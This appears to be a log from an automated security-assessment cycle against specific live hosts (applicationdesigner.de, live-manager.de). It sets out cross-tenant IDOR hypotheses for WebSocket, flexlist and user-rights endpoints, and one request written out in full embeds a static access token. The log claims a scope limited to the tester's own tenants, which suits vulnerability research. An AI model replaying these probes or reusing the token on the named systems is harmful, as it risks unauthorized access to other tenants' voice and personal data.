+- [PRIO] www.applicationdesigner.de/extjs/voicenotes/,6.4,attack_surface=7 business_value=9 tech_exposure=5 gate_ease=7 cloud_surface=2 freshness=9
+
+STEP 3 — HYPOTHESES:
+[HYP] cbs-proxy data-plane cross-tenant frame binding (chain capstone)
+class: IDOR
+asset: wss://cbs-proxy.api.live-manager.de/?origin=LiveDemo&cid={cid}&service={service}
+confidence: 95
+reasoning: proper anonymous WS upgrade returns 101 without any credential; client-supplied cid/service accepted (demo 131727 vs foreign 2, byte-identical CONNECT CBS100/190/200 + READY); transport confirmed live this cycle. No token→cid binding observed at proxy layer; per-cid data-plane output is the only unverified link.
+evidence_needed: operator replays demo-tenant live_debug frame and diffs response set vs a foreign cid control (own two tenants, no third-party).
+verify_steps: AUTH_HELPED: WS-upgrade with cid=131727&service=100, send one live_debug/call-frame, record accepts; repeat with own second cid; byte-diff.
+impact: cross-tenant live-debug/call-flow stream attach (voice/PII); HIGH CVSS 7.5.
+testability: AUTH_HELPED
+
+[HYP] get_user_rights returns per-tenant rights payload under public static credential (no ownership/VPN gate)
+class: IDOR
+asset: www.applicationdesigner.de/extjs/get_user_rights.php?token={LIVE_DEMO_CUSTOMER_TOKEN}&customer_id={cid}
+confidence: 50
+reasoning: HTTP 200 with public token only; body sha256 differs per cid ''/2/131727/999999999 and is non-deterministic across requests (per-request nonce/IV) — server resolves cid-scoped rights for any customer with a static public credential; contradict auth.php which alone got VPN-gated. Payload high-entropy (base64 of 3230 bytes, head 3e7afaff) → encrypted/serialized, not plaintext-readable anonymously.
+evidence_needed: decryption key or operator session that makes the same endpoint return plaintext; otherwise resolver-level defect only.
+verify_steps: PASSIVE: GET with public token for cid 131727 vs 2, compare body sha256 (not content), confirm stability/rotation; done — rotated, cid-dependent.
+impact: per-tenant rights/authz-config disclosure if payload decryptable; presently opaqueness caps severity (LOW–MED); authz-design defect confirmed.
+testability: PASSIVE
+
+[HYP] flexlist per-id reads accept any global flexlist_id with public credential
+class: IDOR
+asset: www.applicationdesigner.de/extjs/flexlist/{getFields,getDetails}.php?token={LIVE_DEMO_CUSTOMER_TOKEN}&flexlist_id={n}
+confidence: 55
+reasoning: token-only gate (HTTP 200 success:true, id 345 → 32 defs/25 rows), no customer_id in request; directory getList token-scoped 10/10 demo (131727); global autoincrement id space 138–345 leaves foreign rows in gaps; cross-tenant "id resolves" unproven — needs an id owned by a second tenant.
+evidence_needed: operator creates flexlist under second owned tenant, GETs with public token; nonzero rows = cross-tenant read.
+verify_steps: AUTH_HELPED (operator, two owned tenants only): GET getDetails.php?token=...&flexlist_id={tenant-B id}&search=; record data_len vs zero and sha256 of body.
+impact: cross-tenant data-table read (flexlist payload incl PII); HIGH if id space not ownership-filtered.
+testability: AUTH_HELPED
+
+STEP 4 — SELF-CRITIQUE:
+- [PARKED] flexlist cross-tenant: unchanged; no foreign flexlist_id known without out-of-scope enumeration; operator second-tenant proof required.
+- [PARKED] get_user_rights content-level: payload rotates per request + high entropy → anonymous plaintext unobtainable; only resolver-level (credential-only, cid-differentiated) defect proven.
+- [PARKED] voicenotes raw-audio (60): demo index empty this cycle (total=0,max_id=0), no own-tenant UUID anchor for positive control.
+- [FINAL] 1. cbs-proxy BOLA (95) — chain capstone, transport-complete, anonymous-confirmed, live (101).
+- [FINAL] 2. voicenotes raw-audio (60) — gate-stage confirmed credential-satisfiable (404 not 403), parked on UUID.
+- [FINAL] 3. flexlist data-grid (55) — token-only gate confirmed, global id space, cross-tenant unproven.
+- [FINAL] 4. get_user_rights (50) — NEW credential-only per-cid resolver, opaque payload.
+
+STEP 5 — NEXT:
+- [NEXT] HUMAN: under a SECOND owned tenant create one flexlist, then `GET https://www.applicationdesigner.de/extjs/flexlist/getDetails.php?token=3498fkgkds458g35h9g835npz98qq4839kajlfhg38963a98z35h898E3DFG38d3&flexlist_id={tenant-B-id}&search=` and same id via getFields.php; nonzero rows under public demo credential = confirmed cross-tenant data read (HIGH, own tenants only); record body sha256.
+
+STEP 6 — LEARNING:
+- [LEARN] ACCEPTED MISCONFIG @ www.applicationdesigner.de/extjs/get_user_rights.php: public static token is sole gate (VPN gate did not extend here, unlike auth.php); per-cid byte-differentiated dynamic high-entropy payload → cross-tenant resolver confirmed at transport level; content opaque (rotation+entropy), no plaintext leak.
+- [LEARN] ACCEPTED MISCONFIG @ www.applicationdesigner.de/extjs/get_speaker.php|get_provider.php: token-only HTTP 200 catalogs (TTS speakers incl provider settings; provider list azure/elevenlabs/chatgpt/cartesia) — static catalog, no per-cid context, LOW.
+- [LEARN] REJECTED MISCONFIG @ www.applicationdesigner.de/api/callbuilder/: prefix 404 dead on www and root applicationdesigner.de (nginx) — documented CallBuilder proxy route not exposed; closed.
+- [LEARN] ACCEPTED IDOR @ cbs-proxy.api.live-manager.de: proper Sec-WebSocket handshake → HTTP 101 (prior 426 was header-shape artifact) — anonymous WS upgrade still live, client-supplied cid/service accepted.
+- [LEARN] help.js route map: mutating/POST set (flexlist createList/addRow/saveValue/updateList/deleteRow/importcsv, voicenotes delete, playback.php, check_mailserver.php, agent/get_agent_costs.php) documented only — OOS for read-only probes.
+
+STEP 7 — RISK:
+- [RISK] questnet-gmbh: 76 — driver cbs-proxy BOLA (95) transport-complete, confirmed live (101), anonymous cid/service accepted. This cycle expanded the credential-only defect family by one (get_user_rights per-cid resolver) but payload is opaque (nonce-rotating, unreadable), capping it. Voicenotes index empty (no UUID anchor); flexlist cross-tenant still parked to operator second-tenant proof; /api/callbuilder/ dead surface closed. Consistent with prior cycles at ceiling AUTH_HELPED; no foreign-live plaintext touched (sha256-only diffs, empty index).
